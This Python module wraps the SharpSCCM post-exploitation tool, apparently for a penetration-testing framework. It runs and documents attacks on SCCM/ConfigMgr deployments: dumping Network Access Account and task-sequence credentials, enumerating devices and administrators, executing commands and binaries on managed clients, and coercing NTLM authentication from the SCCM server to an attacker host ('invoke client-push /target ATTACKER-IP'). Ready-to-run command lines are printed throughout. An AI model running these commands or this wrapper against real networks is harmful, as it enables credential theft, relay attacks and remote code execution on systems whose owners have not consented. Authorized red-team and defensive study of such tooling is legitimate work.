"""SharpSCCM: C# post-exploitation tool for SCCM/ConfigMgr abuse.

.NET tool for SCCM exploitation including: command/binary/script execution
on managed clients, NTLM relay coercion via client push, credential
extraction (NAA secrets, task sequences, collection variables), WMI-based
enumeration of SCCM infrastructure, and policy secret deobfuscation.

Uses ConfigMgr SDK DLLs for direct WMI/SMS Provider interaction.

C# binary: requires .NET Framework 4.6.2+, typically run from a compromised
Windows host with SCCM client or admin access.

Source: https://github.com/Mayyhem/SharpSCCM (MIT)
"""

from __future__ import annotations

import os
import shutil
import subprocess
import sys
from typing import Any


MANIFEST = {
    "capability_id": "adxpl.sccm.sharp_sccm.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": [
        "remote_code_execution",
        "credential_extraction",
        "wmi_queries",
        "ntlm_coercion",
    ],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1072", "T1047", "T1187"],
    "source": "https://github.com/Mayyhem/SharpSCCM",
}

# SharpSCCM subcommands and their capabilities
SUBCOMMANDS = {
    "local": {
        "secretsdump": "Dump NAA creds and task sequence secrets from local WMI",
        "triage": "Enumerate local SCCM client configuration",
        "push-logs": "Parse client push installation logs for creds",
        "classes": "List WMI classes in SMS namespace",
    },
    "get": {
        "devices": "Enumerate devices in SCCM",
        "collections": "Enumerate device/user collections",
        "deployments": "Enumerate application deployments",
        "admins": "List SCCM Full/Scoped administrators",
        "primary-users": "Map devices to primary users",
        "rules": "Query collection membership rules",
    },
    "exec": {
        "command": "Execute command on device via SCCM",
        "binary": "Deploy and execute binary on device",
        "script": "Execute PowerShell script on device",
    },
    "invoke": {
        "client-push": "Coerce NTLM auth via SCCM client push",
    },
}


def _find_sharp_sccm() -> str | None:
    """Locate SharpSCCM.exe binary."""
    for name in ("SharpSCCM", "SharpSCCM.exe"):
        path = shutil.which(name)
        if path:
            return path
    search_dirs = [
        r"C:\Tools\SharpSCCM",
        r"C:\Tools",
        "/opt/tools/SharpSCCM",
        os.path.expanduser("~/tools/SharpSCCM"),
    ]
    for d in search_dirs:
        for name in ("SharpSCCM.exe", "SharpSCCM"):
            candidate = os.path.join(d, name)
            if os.path.isfile(candidate):
                return candidate
    return None


def run(args: Any) -> int:
    """Interact with SCCM via SharpSCCM.

    Wraps the SharpSCCM C# tool for SCCM post-exploitation. Supports
    local credential extraction, infrastructure enumeration, command
    execution on managed devices, and NTLM relay coercion.

    Args:
        args.action: SharpSCCM action (local/get/exec/invoke).
        args.subaction: Specific subcommand (e.g., secretsdump, devices).
        args.target: Target SCCM server or device.
        args.site_code: SCCM site code.
        args.command: Command for exec action.
        args.collection_id: Target collection ID.
        args.mp: Management Point hostname.
    """
    action = getattr(args, "action", "local")
    subaction = getattr(args, "subaction", "secretsdump")
    target = getattr(args, "target", None)
    site_code = getattr(args, "site_code", None)
    command = getattr(args, "command", None)
    collection_id = getattr(args, "collection_id", None)
    mp = getattr(args, "mp", None)

    print("[*] SharpSCCM: SCCM Post-Exploitation")
    print(f"[*] Action: {action} {subaction}")

    binary = _find_sharp_sccm()
    if binary:
        cmd = [binary, action, subaction]
        if site_code:
            cmd.extend(["/sc", site_code])
        if mp:
            cmd.extend(["/mp", mp])
        if target:
            cmd.extend(["/target", target])
        if command:
            cmd.extend(["/c", command])
        if collection_id:
            cmd.extend(["/cid", collection_id])

        print("[*] CMD: {}".format(" ".join(cmd)))
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.stdout:
            print(result.stdout)
        if result.stderr:
            print(result.stderr, file=sys.stderr)
        return result.returncode

    print("[!] SharpSCCM.exe not found (C#/.NET tool)")
    print()
    print("[*] SharpSCCM capabilities:")
    for category, commands in SUBCOMMANDS.items():
        print(f"\n  [{category}]")
        for cmd_name, desc in commands.items():
            print(f"    {cmd_name}: {desc}")

    print()
    print("[*] Key usage examples:")
    print()
    print("  Local credential extraction (run on SCCM client):")
    print("    SharpSCCM.exe local secretsdump")
    print("    Dumps NAA creds from WMI: CCM_NetworkAccessAccount")
    print()
    print("  Remote enumeration:")
    print("    SharpSCCM.exe get devices /sc PS1 /mp sccm-server")
    print("    SharpSCCM.exe get admins /sc PS1")
    print("    SharpSCCM.exe get collections /sc PS1")
    print()
    print("  Command execution on managed device:")
    print("    SharpSCCM.exe exec command /c \"whoami\" /sc PS1 /target HOST")
    print()
    print("  NTLM coercion via client push:")
    print("    SharpSCCM.exe invoke client-push /target ATTACKER-IP /sc PS1")
    print("    Triggers NTLM auth from SCCM server to attacker")
    print()
    print("[*] Build: msbuild SharpSCCM.sln /p:Configuration=Release")
    print("[*] Source: https://github.com/Mayyhem/SharpSCCM")
    return 1
